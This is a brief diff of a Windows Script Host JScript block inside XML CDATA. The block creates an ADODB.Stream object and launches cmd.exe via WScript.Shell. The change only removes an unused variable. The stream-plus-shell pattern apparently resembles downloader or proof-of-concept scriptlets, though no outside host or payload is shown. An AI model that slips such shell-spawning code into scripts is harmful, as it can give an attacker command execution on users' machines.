@@ -14,7 +14,7 @@
 <![CDATA[
   var objArgs=WScript.Arguments; 
   var sGet=new ActiveXObject("ADODB.Stream"); 
-  var xGet=null; 
+
   
   var r = new ActiveXObject("WScript.Shell").Run("cmd.exe");
 ]]>
